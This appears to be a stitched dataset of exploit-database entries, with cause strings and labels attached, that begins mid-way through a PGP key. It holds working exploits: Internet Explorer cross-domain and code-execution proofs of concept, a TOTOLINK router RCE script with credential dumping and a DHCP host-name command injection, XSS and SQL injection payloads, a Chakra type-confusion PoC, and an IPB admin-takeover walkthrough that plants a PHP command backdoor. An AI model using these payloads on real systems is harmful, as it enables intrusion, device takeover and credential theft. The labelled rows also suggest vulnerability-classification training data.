OKLTazoEY3OpHqO6S+2q2wylBFVZqdM41NqTVRC5wQVlQEUo+b4qDoFfp7cWRUix m8+ZbRRN6y8cazDCjnSjXI3GGwd3p00MhJUKevJIuRs6vvrEar2xWcXhuC/TZXPJ bgAeBADsDM3TsSgE458gFLrTIayCTtjJp6OKNT4BmKZarCOfflnqlchOLY8PBsVH flA5jyA8sPFsIoeIFkut7EYx0+8F2ym+oWShb7CVBEYItsh5UmtU2xNWmYoJOx/U bB3PnJKdO3vCxkNseIu8LqHXE1qzkd43ocxx7cPgdREyquZAc7QgUGxlYm8gQWVz ZGkgTmFlbCA8cGxlYm9AZ214Lm5ldD6IXQQTEQIAHgUCQsVHfgIbAwYLCQgHAwID FQIDAxYCAQIeAQIXgAAKCRCtXEZ20jCHQSHUAJiVAuqU55hzf1rSgV2bNyBi71sR AJwMf1orkD0wHd/jZknVAdkO9GHFv7kCDQRCxUecEAgAtrIc15i/g1W7s4IaIhn7 Z0k1V1hDjvrKQiIKb5Rz5ca7659INq4/wpu+pi1usqd3Zb53/ev2fcdYKzWYWd0G dbwSJr8rdKSMr4yGzXoAVCWxjAH91TUeFVRtzQJILlI2C3lm59sQP1YRdMFC+9Le y9Xcx9aSmezh7//xUCzIUJcxenmqXA2R+147aAlQD1BWKemCWEtMVc9Ueh+DclLG tGiSDFBHMIdUT4mB0pFukWGwtOXNnXb8DfYyjfoGQoetcGRiWktQPBByLNToSLnF H8CuT+zMQpvR6JXGKlttShRE0k3QAIlYfktw0loyzqFxglFjdQmI+/jUg0x5/npW 1wADBQf8CkAdF2ZBmzjvWrwfY7DSya8lnxU1JNhXeel+U7xnLt1zCAyUdiYS/jmC PCC0ROaUl0uqwnGybi8UzPzuX2KKhfazNc1mzqJoorzDzEBJ5yMjf4YfbVdTKd5w iOa5DUnDsEx8L1mrXhbRKQ+T/dvb/LOzfxBJrvJofFBAJUS/WEuiWNXPHVGQ2VnW E8jOCf5LaMJXQ8kHZObuMiDazgubcg7MKKCtDSFyxMQL9LvzkdUq6aA60I1AKVv+ zLotUbcfkza5mIySL/QQGEd2N6hSCqo891kNas3bUt6E8BWlaLIuxSPAGe/GxzuZ zjh3eOm/bsXKcJIyd8VuMjuzVxCct4hJBBgRAgAJBQJCxUecAhsMAAoJEK1cRnbS MIdBaNoAoIhMnNOqw2wWJ4R7V1qjUCCQOTP/AJ9Ju97jTO8pL4y08wrUpZ+9V+Ek 0g== =OV2E -----END PGP PUBLIC KEY BLOCK-----  1. SUMMARY ~~~~~~~~~~ This document illustrates two issues found in Internet Explorer: One is READ CONTENT OF ANY DOMAIN Another is DOUBLE-CLICK ANYWHERE ON WEB PAGE COULD ALLOW REMOTE CODE EXECUTION  2. READ CONTENT OF ANY DOMAIN - PROOF OF CONCEPT ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ The following proof of concept is incomplete realization of the idea to demonstrate its feasibility. Windows Server 2003, Enterprise Edition, Service Pack 1, 15/06/2006  Upload the following files to Web server, go to i.html ------------------------- i.html ------------------------- <html><body onload=""setTimeout('alert(o.object.documentElement.outerHTML)',1000)""> <object width=100 height=100 data=r.php?http://www.google.com/123456789 type=text/html id=o></object> </body></html> ------------------------- r.php ------------------------- <?php header(""Location: "".$_SERVER[""QUERY_STRING""]); ?>  i.html displays content of Google Web page.  3. READ CONTENT OF ANY DOMAIN - TIPS FOR MATURE EXPLOIT ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Target Google Desktop, similar to IE Design Flaw Lets Hacker Crack Google Desktop, http://www.eweek.com/article2/0,1895,1895579,00.asp 2. Target webmail  4. DOUBLE-CLICK ANYWHERE ON WEB PAGE COULD ALLOW REMOTE CODE EXECUTION - PROOF OF CONCEPT ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ The following proof of concept is incomplete realization of the idea to demonstrate its feasibility. Windows Server 2003, Enterprise Edition, Service Pack 1, 15/06/2006  Assume C:\SmbPubRO is shared over SMB \\192.168.0.5\SmbPubRO Run CMD, go to C:\SmbPubRO, and then enter the following command:     mkdir test && cd test && mkdir %2e%2e%5cx.{3050f4d8-98B5-11CF-BB82-00AA00BDCE0B} && echo ""<html><body><iframe width=300 height=300 src='./' ></iframe>"" > test.html && cd .. && echo ""<html><body><script>alert('hallo')</script>"" > x.{3050f4d8-98B5-11CF-BB82-00AA00BDCE0B} At last, open IE to \\192.168.0.5\SmbPubRO\test\test.html, and double-click the icon labeled %2e%2e%5cx  MSHTA runs remote code.  5. DOUBLE-CLICK ANYWHERE ON WEB PAGE COULD ALLOW REMOTE CODE EXECUTION - TIPS FOR MATURE EXPLOIT ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 1. Use WebDAV, not SMB 2. Hide suspicious parts by CSS tricks similar to What A Drag! -revisited-, http://www.mikx.de/index.php?p=1 3. Set up scenario of double-click 4. If modified, able to compromise IE7BETA2 5. If modified, no need to double-click",insecure handling of Drag and Drop events,1
32386,Unreal Engine - 'UnChan.cpp' Failed Assertion Remote Denial of Service source: https://www.securityfocus.com/bid/31205/info  Unreal Engine is prone to a remote denial-of-service vulnerability because of an error in memory allocation.  An attacker could exploit this issue to crash applications that use the vulnerable engine and deny service to legitimate users.  The following applications using the engine are vulnerable:  Unreal Tournament 3.1.3 Unreal Tournament 2003 Unreal Tournament 2004 Dead Man's Hand Pariah WarPath Postal 2 Shadow Ops  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32386.zip,an error in memory allocation,1
37623,"15 TOTOLINK Router Models - Multiple Remote Code Execution Vulnerabilities ## Advisory Information  Title: 15 TOTOLINK router models vulnerable to multiple RCEs Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x00.txt Blog URL: https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html Date published: 2015-07-16 Vendors contacted: None Release mode: 0days, Released CVE: no current CVE    ## Product Description  TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea. TOTOLINK produces routers routers, wifi access points and network devices. Their products are sold worldwide.    ## Vulnerabilities Summary  The first vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single HTTP request.  The second vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single DHCP request.  There are direct RCEs against the routers which give a complete root access to the embedded Linux from the LAN side.  The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to the latest firmwares with the default configuration:  - TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin) - TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin) - TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin - totolink.net) - TOTOLINK EX300 : until last firmware (9.36 - ex300_ch_9_36.bin.5357c0 - totolink.cn) - TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0) - TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin) - TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin) - TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin) - TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin) - TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK N302R Plus V1_en_8_82.bin) - TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK N302R Plus V2_en_9_08.bin) - TOTOLINK A3004NS (no firmware available in totolinkusa.com but ipTIME's A3004NS model was vulnerable to the 2 RCEs) - TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)   The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares to the latest firmwares with the default configuration:  - TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin) - TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)   Firmwares come from totolink.net and from totolink.cn.  - - From my tests, it is possible to use these vulnerabilities to overwrite the firmware with a custom (backdoored) firmware.  Concerning the high CVSS score (10/10) of the vulnerabilities and the longevity of this vulnerability (6+ year old), the TOTOLINK users are urged to contact TOTOLINK.    ## Details - RCE with a single HTTP request  The HTTP server allows the attacker to execute some CGI files.  Many of them are vulnerable to a command inclusion which allows to execute commands with the http daemon user rights (root).   Exploit code:  $ cat totolink.carnage #!/bin/sh if [ ! $1 ]; then echo ""Usage:"" echo $0 ip command exit 1 fi wget -qO- --post-data=""echo 'Content-type: text/plain';echo;echo;PATH=$PATH:/sbin $2 $3 $4"" http://$1/cgi-bin/sh   The exploits have been written in HTML/JavaScript, in form of CSRF attacks, allowing people to test their systems in live using their browsers: http://pierrekim.github.io/advisories/   o Listing of the filesystem  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-listing.of.the.filesystem.html  Using CLI:  root@kali:~/totolink# ./totolink.carnage 192.168.1.1 ls | head ash auth busybox cat chmod cp d.cgi date echo false root@kali:~/totolink#   o How to retrieve the credentials ? (see login and password at the end of the text file)  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-dump.configuration.including.credentials.html  Using CLI:  kali# ./totolink.carnage 192.168.1.1 cat /tmp/etc/iconfig.cfg wantype.wan1=dynamic dhblock.eth1=0 ppp_mtu=1454 fakedns=0 upnp=1 ppp_mtu=1454 timeserver=time.windows.com,gmt22,1,480,0 wan_ifname=eth1 auto_dns=1 dhcp_auto_detect=0 wireless_ifmode+wlan0=wlan0,0 dhcpd=0 lan_ip=192.168.1.1 lan_netmask=255.255.255.0 dhcpd_conf=br0,192.168.1.2,192.168.1.253,192.168.1.1,255.255.255.0 dhcpd_dns=164.124.101.2,168.126.63.2 dhcpd_opt=7200,30,200, dhcpd_configfile=/etc/udhcpd.conf dhcpd_lease_file=/etc/udhcpd.leases dhcpd_static_lease_file=/etc/udhcpd.static use_local_gateway=1 login=admin password=admin  Login and password are stored in plaintext, which is a very bad security practice.   o Current running process:  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-current.process.html  Using CLI:  kali# ./totolink.carnage 192.168.1.1 ps -auxww   o Getting the kernel memory:  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-getting.kernel.memory.html  Using CLI:  kali# ./totolink.carnage 192.168.1.1 cat /proc/kcore   o Default firewall rules:  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-default.firewall.rules.html  Using CLI:  kali# ./iptime.carnage.l2.v9.52 192.168.1.1 iptables -nL   o Opening the management interface on the WAN:  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-opening.the.firewall.html   o Reboot the device:  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-reboot.html   o Brick the device:  HTML/JS exploits:  http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-bricking.the.device.html   An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.  By the way, d.cgi in /bin/ is an intentional backdoor.    ## Details - RCE with a single DHCP request  This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD server in TOTOLINK devices allows remote attackers to execute arbitrary commands via shell metacharacters in the host-name field.  Sending a DHCP request with this parameter will reboot the device:  cat /etc/dhcp/dhclient.conf  send host-name "";/sbin/reboot"";  When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we will see the stdout of the /dev/console device; the dhcp request will immediately force the reboot of the remote device:   Booting...  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ @ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize @ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h @ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName @ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16 @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  [...] WiFi Simple Config v1.12 (2009.07.31-11:35+0000).  Launch iwcontrol: wlan0 Reaped 317 iwcontrol RUN OK SIGNAL -> Config Update signal progress killall: pppoe-relay: no process killed SIGNAL -> WAN ip changed WAN0 IP: 192.168.2.1 signalling START Invalid upnpd exit killall: upnpd: no process killed upnpd Restart 1 iptables: Bad rule (does a matching rule exist in that chain?) Session Garbage Collecting:Maybe system time is updated.( 946684825 0 ) Update Session timestamp and try it after 5 seconds again. ez_ipupdate callback --> time_elapsed: 0 Run DDNS by IP change:  / 192.168.2.1 Reaped 352 iptables: Bad rule (does a matching rule exist in that chain?) Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048 Reaped 363 Led Silent Callback Turn ON All LED Dynamic Channel Search for wlan0 is OFF start_signal => plantynet_sync Do start_signal => plantynet_sync SIGNAL -> Config Update signal progress killall: pppoe-relay: no process killed SIGNAL -> WAN ip changed Reaped 354 iptables: Bad rule (does a matching rule exist in that chain?) ez_ipupdate callback --> time_elapsed: 1 Run DDNS by IP change:  / 192.168.2.1 Burst DDNS Registration is denied: iptime -> now:26 Led Silent Callback Turn ON All LED /proc/sys/net/ipv4/tcp_syn_retries: cannot create - - - ---> Plantynet Event : 00000003 - - - ---> PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE   [sending the DHCP request]   [01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1 00:01:03 miniupnpd[370]: received signal 15, good-bye Reaped 392 Reaped 318 Reaped 314 Reaped 290 Reaped 288 Reaped 268 Reaped 370 Reaped 367 - - - ---> PLANTYNET_SYNC_FREE_DEVICE Restarting system.  Booting...  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ @ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize @ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h @ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName @ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16 @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Reboot Result from Watchdog Timeout!  - - - ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz) Delay 1 second till reset button Magic Number: raw_nv 00000000 Check Firmware(05020000) : size: 0x001ddfc8 ---->   [...]   An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.    ## Vendor Response  Due to ""un-ethical code"" found in TOTOLINK products (= backdoors found in new TOTOLINK devices), TOTOLINK was not contacted in regard of this case, but ipTIME was contacted in April 2015 concerning the first RCE.    ## Report Timeline  * Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in ipTIME products. * Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products. * Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products. * Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and EX750 routers. * Jul 13, 2015: Updated firmwares confirmed vulnerable. * Jul 16, 2015: A public advisory is sent to security mailing lists.    ## Credit  These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).    ## References  https://pierrekim.github.io/advisories/2015-totolink-0x00.txt https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html    ## Disclaimer  This advisory is licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/","""un-ethical code""",0
36402,Hero 3.69 - 'month' Cross-Site Scripting source: https://www.securityfocus.com/bid/50878/info  Hero is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Hero 3.69 is vulnerable; other versions may also be affected.   http://www.example.com/hero_os/events?month=January.htaccess.aspx%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,fails to sufficiently sanitize user-supplied data,1
29747,DirectAdmin 1.292 - 'CMD_USER_STATS' Cross-Site Scripting source: https://www.securityfocus.com/bid/22996/info  DirectAdmin is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/CMD_USER_STATS?RESULT='http://example2.com/script.js',the application fails to properly sanitize user-supplied input,1
45215,"Microsoft Edge Chakra JIT - 'DictionaryPropertyDescriptor::CopyFrom' Type Confusion /* Here's the method.     template <typename TPropertyIndex>     template <typename TPropertyIndexFrom>     void DictionaryPropertyDescriptor<TPropertyIndex>::CopyFrom(DictionaryPropertyDescriptor<TPropertyIndexFrom>& descriptor)     {         this->Attributes = descriptor.Attributes;         this->Data = (descriptor.Data == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Data;         this->Getter = (descriptor.Getter == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Getter;         this->Setter = (descriptor.Setter == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Setter;         this->IsAccessor = descriptor.IsAccessor;  #if ENABLE_FIXED_FIELDS         this->IsInitialized = descriptor.IsInitialized;         this->IsFixed = descriptor.IsFixed;         this->UsedAsFixed = descriptor.UsedAsFixed; #endif     }  Given its name, I think that the method is supposed to copy all the fields from another descriptor to ""this"". But it actually leaves some fields uncopied. The ""IsShadowed"" field is one of them which indicates that a Let or Const variable has been declared in the global object with the same name as the name of a property of the global object. This lack of copying the ""IsShadowed"" field can lead to type confusion like in the PoC or uninitialized pointer dereference.  PoC: */  let x = 1;  this.x = 0x1234;  // IsShadowed  // Convert to BigDictionaryTypeHandler, CopyFrom will be used in the process. for (let i = 0; i < 0x10000; i++) {     this['a' + i] = 1; }  // Set IsAccessor this.__defineSetter__('x', () => {});  // Type confusion this.x;",nce,0
29694,"S9Y Serendipity 1.1.1 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/22774/info  Serendipity is affected by an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  Exploiting this vulnerability could permit remote attackers to pass malicious input to database queries, resulting in the modification of query logic or other attacks.   POST /serendipity/index.php?frontpage HTTP/1.0 User-Agent: Mozilla/5.0 (SaMuschie) Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Content-Type: application/x-www-form-urlencoded Content-Length: 67 Connection: close serendipity%5BmultiCat%5D%5B%5D='&serendipity%5BisMultiCat%5D=Go%21",the application fails to properly sanitize user-supplied input before using it in an SQL query,1
25441,"Invision Power Board 1.x?/2.x/3.x - Admin Takeover IPB (Invision Power Board) all versions (1.x? / 2.x / 3.x) Admin account Takeover leading to code execution  Written on : 2013/05/02 Released on : 2013/05/13 Author: John JEAN (@johnjean on twitter) Affected application: Invision Power Board <= 3.4.4 Type of vulnerability: Logical Vulnerability / Bad Sanitization Required informations : Administrator's email Evaluated Risk : Critical Solution Status : A patch has been released which fixes these vulnerabilities References :  http://www.john-jean.com/blog/securite-informatique/ipb-invision-power-board-all-versions-1-x-2-x-3-x-admin-account-takeover-leading-to-code-execution-742   [0] Application description & Deployment estimation  From wikipedia.org: Invision Power Board (abbreviated IPB, IP.Board or IP Board) is an Internet forum software produced by Invision Power Services, Inc. It is written in PHP and primarily uses MySQL as a database management system, although support for other database engines is available. While Invision Power Board is a commercially sold product, there is a large modding community and many of these modifications are free. In addition, many groups offer the download or design of free and paid skins.  ----  This software is deployed on very popular websites such as: NASA, EMI, NHL, NBC, O'Reilly, Evernote, ...  You can easily find tens of thousands of deployed instances using Google dorks such as: ""inurl:index.php?app=core"" or ""powered by Invision Power Board"".    [I] Logic Flaw  	A) Overview  IPB harbors a sanitization flaw in its registration form and user control panel (accessible once logged in). Incorrect e-mail address validation code allows an attacker to take over the admin account without prompting any alert but preventing the real admin to login afterwards. After a successful takeover, the attacker can plant a PHP backdoor using IPB's templating system. Thorough administrators will inspect total file system after they recover their hacked account, while other administrators might assume they are dealing with a bug, receive their new password using ""Password recovery"" system and leave the backdoor intact. Attacker may also use the ""Retrieve password"" process to mislead the admin into thinking their account was locked due to unsuccessful login attempts and not investigating further, thus preserving the backdoor.   	B) Required data  		1) Administrator's login name  The admin login is easily found by clicking on ""The moderating Team"" link on recent IPB's footer, or using the URL below: index.php?app=forums&module=extras§ion=stats&do=leaders   		2) Administrator's e-mail  Obtaining the admin e-mail may be more complicated as there is no automated way to get it. The attacker can get it through:       - using whois on domain.tld to get registrar informations      - looking up a prospective e-mail on Facebook and see if a matching profile shows up      - using Gravatar (Gravatar is a personal avatar you can find on most blogs, forum, etc comments based on user e-mail address). Attacker can create a script to retrieve an email based on an avatar. For example mine is: http://www.john-jean.com/gravapwnd.php?zboob=john@wargan.com      - do sourcing using FB, G+, Twitter, Google SERP, ...      - use SE methods, such as faked e-mail catcher; or use XSSs on known websites consulted by the target.   	C) Explanation  This vulnerability is grounded on both a mistake in MySQL knowledge and bad sanitization of the $email variable. 		1) First of all, let's summarize how MySQL works:  			- Truncating while INSERT  During an INSERT query, if the string exceeds the field size defined when creating the table, the string will be truncated. E.g.:  ************************ BEGIN OF CODE ************************ CREATE TABLE `test` ( `limitvarchar` varchar(5) NOT NULL ); --- INSERT INTO `test` (`limitvarchar`) VALUES ('123456789'); --- SELECT * FROM `test` > 12345 ************************* END OF CODE ***************************  However, the string is not truncated during SELECT queries. The following query will not return any result:  ************************ BEGIN OF CODE ************************ SELECT * FROM `test` WHERE `limitvarchar` = ""123456"" ************************* END OF CODE ***************************  MySQL use permissive SELECT:  SELECT ignores spaces at the end of strings. Let's INSERT some datas:  ************************ BEGIN OF CODE ************************ INSERT INTO `divers`.`test` (`limitvarchar`) VALUES ('1    '); INSERT INTO `divers`.`test` (`limitvarchar`) VALUES ('1   '); INSERT INTO `divers`.`test` (`limitvarchar`) VALUES ('1  '); INSERT INTO `divers`.`test` (`limitvarchar`) VALUES ('1 '); INSERT INTO `divers`.`test` (`limitvarchar`) VALUES ('1'); ************************* END OF CODE ***************************  Thus the following query will yield the 5 records inserted before:  ************************ BEGIN OF CODE ************************ SELECT * FROM `test` WHERE limitvarchar='1    ' ************************* END OF CODE ***************************  Now, let's have a look at the checkEmailAddress function of admin/source/base/core.php:  ************************ BEGIN OF CODE ************************  /** 	 * Check email address to see if it seems valid 	 * 	 * @param	string		Email address 	 * @return	boolean 	 * @since	2.0 	 */ 	static public function checkEmailAddress( $email = """" ) 	{ 		$email = trim($email);  		$email = str_replace( "" "", """", $email );  		//----------------------------------------- 		// Check for more than 1 @ symbol 		//-----------------------------------------  		if ( substr_count( $email, '@' ) > 1 ) 		{ 			return FALSE; 		}   	if ( preg_match( '#[\;\#\n\r\*\'\""<>&\%\!\(\)\{\}\[\]\?\\/\s\,]#', $email ) ) 		{ 			return FALSE; 		} 		/* tld increased to 32 characters as per RFC - http://community.invisionpower.com/resources/bugs.html/_/ip-board/ipstextcheckemailaddress-does-not-match-new-2013-tlds-r41518*/ 		else if ( preg_match( '/^.+\@(\[?)[a-zA-Z0-9\-\.]+\.([a-zA-Z]{2,32}|[0-9]{1,4})(\]?)$/', $email) )  	{  		return TRUE;  	}  	else  	{  		return FALSE;  	} 	}  ************************* END OF CODE ***************************  As you may know, trim only removes whitespace (and some others) characters BEFORE and AFTER the string, that is why IPB core team also use str_replace to remove space chars IN the email string. However, this treatment is performed to change the email address to the correct format. This is done to ensure the next steps of the check, but there will be no condition returning false if string has been trim or if str_replace has been used. This function checks an email validity format used in the register form and the change email form.  Let's take a look at a another function called load( $member_key, $extra_tables='all', $key_type='' ) in admin/sources/base/ipsMember.php  ************************ BEGIN OF CODE ************************ 	static public function load( $member_key, $extra_tables='all', $key_type='' ) 	{ 		//----------------------------------------- 		// INIT 		//-----------------------------------------  		$member_value    = 0; 		$members         = array(); 		$multiple_ids    = array(); 		$member_field    = ''; 		$joins           = array(); 		$tables          = array( 'pfields_content' => 0, 'profile_portal' => 0, 'groups' => 0, 'sessions' => 0, 'members_partial' => 0 ); 		$remap           = array( 'extendedProfile'    => 'profile_portal', 							      'customFields'       => 'pfields_content');  		//----------------------------------------- 		// ID or email? 		//-----------------------------------------  		if ( ! $key_type ) 		{ 			if ( is_array( $member_key ) ) 			{ 				$multiple_ids = array_map( 'intval', $member_key ); // Bug #20908 				$member_field = 'member_id'; 			} 			else 			{ 				if ( strstr( $member_key, '@' ) ) 				{ 					$member_value = ""'"" . ipsRegistry::DB()->addSlashes( strtolower( $member_key ) ) . ""'""; 					$member_field = 'email'; 				} 				else 				{ 					$member_value = intval( $member_key ); 					$member_field = 'member_id'; 				} 			} 		} [...]  case 'email': 					if ( is_array( $member_key ) ) 					{ 						array_walk( $member_key, create_function( '&$v,$k', '$v=""\'"".ipsRegistry::DB()->addSlashes( strtolower( $v ) ) . ""\'"";' ) ); 						$multiple_ids = $member_key; 					} 					else 					{ 						$member_value = ""'"" . ipsRegistry::DB()->addSlashes( strtolower( $member_key ) ) . ""'""; 					} 					$member_field = 'email';  ************************* END OF CODE ***************************  As you can see, this function does not perform any verification on the length of $member_key & $v. We will exploit that in the next part.  	D) Exploitation  Previously, on this adviso: we saw that $email is not rejected if it contains spurious whitespace, and that $member_key & $v length is not checked. We also saw some MySQL use-cases. Let's see how we can exploit that:  The e-mail field from the `members` table in IPB is declared as a varchar(150). Upon registration, we fill the mail member (or admin) for which we want to steal the account to which we add a padding space for the size of the string exceeds 150. Then we add any character after the space one. It is necessary to bypass ajax's validator, feel free to use Burp Suite or Tamperdata.  For example: Real administrator's email: 'admin@admin.com' Attacker's mail fill: 'admin@admin.com                                                                                                                                       AAAA' <- ends here  The SELECT query checking existing e-mails will not yield any result: SELECT * FROM members WHERE email='admin@admin.com                                                                                                                                       AAAA' <- ends here  The new account is successfully created. Our account is now using the e-mail address below: 'admin@admin.com                                                                                                                                       ' <- ends here AAAA has been deleted by MySQL: string exceeding 150 characters are truncated.  At this stage, we have two users with very similar e-mail addresses: Administrator is: 'admin@admin.com' Attacker is: 'admin@admin.com                                                                                                                                       ' <- ends here  POST HTTP request looks like (on registration page):  ************************ BEGIN OF CODE ************************ POST /~codereview/IPB/index.php?app=core&module=global§ion=register HTTP/1.1 Host: gfy.wargan.com User-Agent: Wargan/1.0 (WarganOS; Amstrad; rv:1.0) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://gfx.wargan.com/~codereview/IPB/index.php?app=core&module=global§ion=register Cookie: session_id=00000000000; member_id=2; pass_hash=000000000000; ipsconnect_0000000000=1; coppa=0; rteStatus=rte Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 466  termsread=1&agree_to_terms=1&do=process_form&coppa_user=0&nexus_pass=1&time_offset=1&dst=1&members_display_name=pentest&EmailAddress=pentest%40wargan.com            A&PassWord=pentest&PassWord_Check=pentest&recaptcha_challenge_field=03AHJ_VuvGN728OMAVD0UvgLdylK1KAt8WH0N2aezZZpZfluTG8wJmfSyhiKM0zYb7io5sk62SQ9fQ2Y1XKqPOmEG0hW9DrThpXgEh-DU73qdpZ_OPxkO_v1xg2k1dJSOCk0wZcxufezfezefezFM0LSCwjJn7bbJJMk&recaptcha_response_field=mmotlyiinducted&agree_tos=1 ************************* END OF CODE ***************************  We now can change our password. The profile corresponding to our session's e-mail will be used. As already stated, spaces are not taken in consideration. The query will thus actually return the first matching e-mail result: the real administrator account. We will have actually changed the password of the administrator profile.  This flaw is usable both on the registration page and on the user control panel (index.php?app=core&module=usercp&tab=core&area=email).  	E) Backdooring  Once the attacker has got access to the administrator's backend, all he needs to do is go to /admin/index.php?adsess=000&app=core&module=templates§ion=templates&do=list&setID=1 and add some code to the defaultHeader template:  ************************ BEGIN OF CODE ************************ <php> if(isset($_REQUEST['pwnd'])) {  $pwnd=$_REQUEST['pwnd'];  echo `$pwnd`; }  </php> ************************* END OF CODE ***************************  <php> & </php> markups are used by the IPB's templating system to add inline PHP code. `` characters in PHP are used to do system calls. Once such a backdoor has been planted, any part of public_html can be compromised and it may also lead to privilege escalation on a dedicated server or LAN.  index.php?lolz=ls%20/ returns: bin boot build dev etc home initrd.img initrd.img.old lib lost+found media mnt nonexistent opt proc root run sbin selinux srv sys tmp usr var vmlinuz vmlinuz.old   [II] Mitigation  	A) Patch party !  These are two quick & dirty patches, but they work.  admin/source/base/core.php should be:  ************************ BEGIN OF CODE ************************ /** 	 * Check email address to see if it seems valid 	 * 	 * @param	string		Email address 	 * @return	